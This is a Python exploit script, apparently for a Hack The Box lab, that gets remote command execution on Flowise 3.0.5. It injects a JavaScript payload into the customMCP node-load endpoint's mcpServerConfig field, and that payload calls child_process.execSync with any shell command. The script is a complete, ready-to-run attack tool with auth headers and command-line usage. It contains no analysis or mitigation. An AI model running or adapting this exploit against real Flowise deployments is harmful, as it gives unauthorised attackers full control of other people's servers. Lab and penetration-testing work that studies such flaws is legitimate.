#!/usr/bin/env python3
"""
Flowise CustomMCP node-load RCE helper (mcpServerConfig → Function()).

Auth that worked on Silentium lab Flowise 3.0.5:
  Authorization: <API_KEY>   (raw key)
  workspaceid: <uuid>

Response body may still be "No Available Actions" while the command runs — verify OOB.

Usage:
  python3 flowise_custommcp_rce.py --base http://staging.silentium.htb \\
      --api-key '...' --workspace-id '...' --cmd 'id'
"""
from __future__ import annotations

import argparse
import json
import urllib.error
import urllib.request


def rce(base: str, api_key: str, workspace: str, cmd: str, timeout: int = 25) -> str:
    mcp = (
        '({x:(function(){const cp=process.mainModule.require("child_process");'
        f"cp.execSync({json.dumps(cmd)});return 1;"
        "})()})"
    )
    payload = {
        "loadMethod": "listActions",
        "inputs": {"mcpServerConfig": mcp},
    }
    body = json.dumps(payload).encode()
    headers = {
        "Content-Type": "application/json",
        "Authorization": api_key,
        "workspaceid": workspace,
    }
    req = urllib.request.Request(
        base.rstrip("/") + "/api/v1/node-load-method/customMCP",
        data=body,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return f"{resp.status} {resp.read().decode()[:500]}"
    except urllib.error.HTTPError as e:
        return f"{e.code} {e.read().decode()[:500]}"


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--base", required=True)
    p.add_argument("--api-key", required=True)
    p.add_argument("--workspace-id", required=True)
    p.add_argument("--cmd", required=True)
    p.add_argument("--timeout", type=int, default=25)
    args = p.parse_args()
    print(rce(args.base, args.api_key, args.workspace_id, args.cmd, args.timeout))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
